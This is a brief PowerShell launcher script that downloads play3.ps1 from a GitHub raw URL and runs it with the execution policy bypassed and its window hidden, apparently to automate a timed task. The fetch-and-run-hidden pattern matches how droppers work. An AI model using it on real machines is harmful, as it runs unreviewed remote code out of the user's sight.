'TAG:T1785259253'
$t=[int](Get-Date -UFormat %s)
irm "https://raw.githubusercontent.com/bloxvm4826/winvm/main/play3.ps1?t=$t" -OutFile C:\play3.ps1
Remove-Item C:\play3.log -EA 0
Start-Process powershell -ArgumentList "-ExecutionPolicy","Bypass","-WindowStyle","Hidden","-File","C:\play3.ps1","-Minutes","55" -WindowStyle Hidden
Start-Sleep -m 2500
"v3 launched"
